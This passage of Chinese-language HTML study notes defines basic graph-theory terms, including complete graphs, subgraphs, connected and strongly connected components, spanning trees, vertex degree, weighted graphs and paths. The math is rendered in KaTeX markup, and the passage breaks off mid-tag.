<p>一个图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 如果满足：不存在重复边；不存在顶点到自身的边，那么称图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 为简单图。若图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 中某两个顶点之间的边数大于 <code>1</code> 条，又允许顶点通过一条边和自身关联，则称图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 为多重图。多重图和简单图的定义是相对的。</p>
</li>
<li>
<p><strong>完全图（也称简单完全图）</strong></p>
<p>对于无向图，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>E</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|E|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">∣</span></span></span></span> 的取值范围为 <code>0</code> 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">n(n - 1) / 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord">/2</span></span></span></span>，有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">n(n - 1) / 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord">/2</span></span></span></span> 条边的无向图称为 <strong>完全图</strong>，在完全图中任意两个顶点之间都存在边。对于有向图，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>E</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|E|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">∣</span></span></span></span> 的取值范围为 <code>0</code> 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n(n - 1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n(n - 1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span> 条弧的有向图称为 <strong>有向完全图</strong>，在有向完全图中任意两个顶点之间都存在方向相反的两条弧。</p>
</li>
<li>
<p><strong>子图</strong></p>
<p>设有两个图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mo>=</mo><mo stretchy="false">(</mo><mi>V</mi><mo separator="true">,</mo><mi>E</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">G = (V, E)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mclose">)</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>G</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mo stretchy="false">(</mo><msup><mi>V</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><msup><mi>E</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">G' = (V', E')</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>V</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">V'</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span> 是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span> 的子集，且 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>E</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">E'</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span> 是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi></mrow><annotation encoding="application/x-tex">E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span> 的子集，则称 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>G</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">G'</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span> 是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 的子图。若有满足 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo stretchy="false">(</mo><msup><mi>G</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo>=</mo><mi>V</mi><mo stretchy="false">(</mo><mi>G</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">V(G') = V(G)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mopen">(</span><span class="mord mathnormal">G</span><span class="mclose">)</span></span></span></span> 的子图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>G</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">G'</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>，则称其为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 的 <strong>生成子图</strong>。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>并非 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi></mrow><annotation encoding="application/x-tex">E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span> 的任何子集都能构成 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 的子图，因为这样的子集可能不是图，即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi></mrow><annotation encoding="application/x-tex">E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span> 的子集中的某些边关联的顶点可能不在这个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span> 的子集中</p>
</div>
</li>
<li>
<p><strong>连通、连通图和连通分量</strong></p>
<p>在无向图中，若从顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 到顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi></mrow><annotation encoding="application/x-tex">w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span> 有路径存在，则称 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi></mrow><annotation encoding="application/x-tex">w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span> 是 <strong>连通</strong> 的。若图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 中任意两个顶点都是连通的，则称图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 为 <strong>连通图</strong>，否则称为 <strong>非连通图</strong>。无向图中的极大连通子图称为 <strong>连通分量</strong>。</p>
</li>
<li>
<p><strong>强连通图、强连通分量</strong></p>
<p>在有向图中，如果有一对顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi></mrow><annotation encoding="application/x-tex">w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span>，从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi></mrow><annotation encoding="application/x-tex">w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span> 和从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi></mrow><annotation encoding="application/x-tex">w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span> 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 之间都有路径，则称这两个顶点是 <strong>强连通</strong> 的。若图中任何一对顶点都是强连通的，则称此图为 <strong>强连通图</strong>。有向图中的极大强连通子图称为 <strong>有向图的强连通分量</strong>。</p>
</li>
<li>
<p><strong>生成树、生成森林</strong></p>
<p>连通图的生成树是包含图中全部顶点的一个极小连通子图。若图中顶点数为 <code>n</code>，则它的生成树含有 <code>n - 1</code> 条边。包含图中全部顶点的极小连通子图，只有生成树满足这个极小条件，对生成树而言，若砍去它的一条边，则会变成非连通图，若加上一条边则会形成一个回路。在非连通图中，连通分量的生成树构成了非连通图的生成森林。</p>
<div class="hint-container tip">
<p class="hint-container-title">区分极大连通子图和极小连通子图</p>
<p>极大连通子图是无向图的连通分量、极大即要求该连通子图包含其所有的边；极小连通子图是既要保持图连通又要使得边数最少的子图</p>
</div>
</li>
<li>
<p><strong>顶点的度、入度和出度</strong></p>
<p>在无向图中，顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 的度是指依附于顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 的边的条数，记为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mi>D</mi><mo stretchy="false">(</mo><mi>v</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">TD(v)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">)</span></span></span></span>。</p>
<p>在有向图中，顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 的度分为入度和出度，入度是以顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 为终点的有向边的数目，记为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mi>D</mi><mo stretchy="false">(</mo><mi>v</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ID(v)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">)</span></span></span></span>；而出度是以顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 为起点的有向边的数目，记为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mi>D</mi><mo stretchy="false">(</mo><mi>v</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">OD(v)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">)</span></span></span></span>。</p>
</li>
<li>
<p><strong>边的权和网</strong></p>
<p>在一个图中，每条边都可以标上具有某种含义的数值，该数值称为该边的 <strong>权值</strong>。这种边上带有权值的图称为 <strong>带权图</strong>，也称 <strong>网。</strong></p>
</li>
<li>
<p><strong>稠密图、稀疏图</strong></p>
<p>边数很少的图称为 <strong>稀疏图</strong>，反之称为 <strong>稠密图</strong>。稀疏和稠密本身是模糊的概念，稀疏图和稠密图常常是相对而言的。一般当图 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 满足 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>E</mi><mi mathvariant="normal">∣</mi><mo>&lt;</mo><mi mathvariant="normal">∣</mi><mi>v</mi><mi mathvariant="normal">∣</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi mathvariant="normal">∣</mi><mi>V</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|E| &lt; |v| log |V|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord">∣</span></span></span></span> 时，可以将 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 视为稀疏图。</p>
</li>
<li>
<p><strong>路径、路径长度和回路</strong></p>
<p>顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">v_{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 到顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">v_{q}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 